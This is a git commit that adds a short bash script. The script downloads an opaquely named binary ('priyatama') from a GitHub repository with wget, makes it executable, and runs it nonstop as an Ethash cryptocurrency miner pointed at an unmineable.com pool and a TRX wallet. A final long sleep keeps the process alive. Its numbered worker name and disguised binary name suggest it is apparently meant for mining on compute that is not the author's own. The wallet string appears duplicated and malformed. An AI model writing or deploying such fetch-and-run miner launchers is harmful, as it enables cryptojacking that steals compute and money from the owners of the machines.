f5f444ab3c8a1f8ed1940e368cbf420f15ecb965
squibex <90225595+squibex@users.noreply.github.com>
2021-09-12 13:12:10 +0700

    Create sajan10.sh

---
+++ sajan10.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+POOL=ethash.unmineable.com:3333
+WALLET=TRX:THy2QWqsFcEQoEbKowmQR3jQjrW299ZbNtTHy2QWqsFcEQoEbKowmQR3jQjrW299ZbNt
+WORKER=kuli10
+wget https://github.com/squibex/prem/raw/main/priyatama
+chmod +x priyatama
+	while [ 1 ]; do
+		./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+        sleep 5
+	done
+sleep 999999999 
